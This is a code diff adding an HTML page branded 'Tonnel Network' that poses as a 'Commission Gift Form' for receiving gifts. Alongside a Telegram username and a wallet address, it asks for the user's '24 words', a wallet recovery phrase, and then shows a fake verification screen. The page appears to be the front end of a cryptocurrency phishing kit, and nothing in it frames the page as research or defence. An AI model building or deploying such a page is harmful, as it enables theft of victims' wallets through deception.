@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <title>Tonnel Network</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="styles.css" />
+</head>
+<body>
+  <div class="app-shell">
+    <div class="bg-glow glow-1"></div>
+    <div class="bg-glow glow-2"></div>
+
+    <div id="language-screen" class="screen active">
+      <div class="phone-frame">
+        <div class="panel main-panel language-panel">
+          <div class="brand-block">
+            <div class="brand-pill">TONNEL NETWORK</div>
+            <h1 class="title" data-i18n="languageTitle">Choose language</h1>
+            <p class="subtitle" data-i18n="languageSubtitle">Select the interface language to continue</p>
+          </div>
+
+          <div class="lang-grid">
+            <button class="lang-btn" data-lang="en">
+              <span class="lang-flag">🇬🇧</span>
+              <span class="lang-name">English</span>
+            </button>
+            <button class="lang-btn" data-lang="ru">
+              <span class="lang-flag">🇷🇺</span>
+              <span class="lang-name">Русский</span>
+            </button>
+            <button class="lang-btn" data-lang="uk">
+              <span class="lang-flag">🇺🇦</span>
+              <span class="lang-name">Українська</span>
+            </button>
+            <button class="lang-btn" data-lang="zh">
+              <span class="lang-flag">🇨🇳</span>
+              <span class="lang-name">中文</span>
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div id="form-screen" class="screen">
+      <div class="phone-frame">
+        <div class="panel top-panel">
+          <div>
+            <div class="brand-row">
+              <div class="brand-pill">TONNEL NETWORK</div>
+            </div>
+            <div class="top-title" data-i18n="formTitle">Commission Gift Form</div>
+            <div class="top-subtitle" data-i18n="formSubtitle">Fill in your details to receive gifts from the commission balance</div>
+          </div>
+        </div>
+
+        <form id="commission-form" class="panel form-panel">
+          <label class="field-block">
+            <span class="field-label" data-i18n="telegramUsername">Telegram username</span>
+            <input id="telegram" name="telegram" type="text" inputmode="text" autocomplete="off" placeholder="@username" required />
+          </label>
+
+          <label class="field-block">
+            <span class="field-label" data-i18n="giftCount">How many gifts were put on withdrawal</span>
+            <input id="giftCount" name="giftCount" type="number" min="0" step="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off" placeholder="0" required />
+          </label>
+
+          <label class="field-block">
+            <span class="field-label" data-i18n="commissionBalance">Exact commission balance</span>
+            <input id="commissionBalance" name="commissionBalance" type="text" inputmode="decimal" autocomplete="off" placeholder="0.000" required />
+          </label>
+
+          <label class="field-block">
+            <span class="field-label" data-i18n="address">Your address</span>
+            <input id="address" name="address" type="text" autocomplete="off" placeholder="Address" required />
+          </label>
+
+          <label class="field-block">
+            <span class="field-label" data-i18n="words24">Your 24 words</span>
+            <textarea id="words24" name="words24" rows="4" autocomplete="off" placeholder="word1 word2 word3 ..." required></textarea>
+          </label>
+
+          <button id="submitBtn" class="primary-btn" type="submit" data-i18n="submit">Submit</button>
+        </form>
+      </div>
+    </div>
+
+    <div id="status-screen" class="screen">
+      <div class="phone-frame">
+        <div class="panel status-panel">
+          <div id="loading-state" class="status-state active">
+            <div class="loader-wrap">
+              <div class="loader-ring ring-1"></div>
+              <div class="loader-ring ring-2"></div>
+              <div class="loader-core"></div>
+            </div>
+            <div class="status-title" data-i18n="processingTitle">Processing request</div>
+            <div class="status-text" data-i18n="processingText">Please wait while your request is being verified</div>
+          </div>
+
+          <div id="success-state" class="status-state success-state">
+            <div class="checkmark-wrap">
+              <svg class="checkmark" viewBox="0 0 120 120" aria-hidden="true">
+                <circle class="checkmark-circle" cx="60" cy="60" r="54"></circle>
+                <path class="checkmark-path" d="M34 63.5L51 80.5L87 43.5"></path>
+              </svg>
+            </div>
+            <div class="status-title" data-i18n="successTitle">Request sent</div>
+            <div id="success-message" class="status-text"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="config.js"></script>
+  <script src="app.js"></script>
+</body>
+</html>
